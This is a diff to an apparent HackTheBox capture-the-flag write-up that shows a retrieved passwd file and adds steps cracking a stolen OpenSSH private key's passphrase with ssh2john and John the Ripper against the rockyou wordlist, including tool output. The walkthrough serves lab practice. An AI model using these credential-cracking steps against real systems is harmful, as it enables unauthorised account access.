@@ -143,6 +143,24 @@ william:x:1001:1001::/home/william:/bin/bash
 _laurel:x:101:988::/var/log/laurel:/bin/false
 ```
 
-2 users stand out in this passwd file -- `trivia` and `william`. `_laurel` likely relates to a logging software used to track movements within the system. If this were a real scenario be mindful of that is pertinent. We try to login via ssh but we need the passphrase or password to login. The passphrase can be obtained through decrypting the hash of the OPENSSH key.
+2 users stand out in this passwd file -- `trivia` and `william`. `_laurel` likely relates to a logging software used to track movements within the system. If this were a real scenario be mindful of that is pertinent. 
 
-We could try both users but it's better practice to first meet some prerequisites. Firstly need to 
+We try to login via ssh but we need the passphrase or password to login. The passphrase can be obtained through decrypting the hash of the OPENSSH key.
+
+We could try both users but it's better practice to first meet some prerequisites. Firstly need to hash the openssh key and crack via john the ripper.
+
+```
+┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB/CVE-2025-2304]
+└─# ssh2john ./id_ed25519 > hash.txt    
+                                                                      
+┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB/CVE-2025-2304]
+└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 24 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
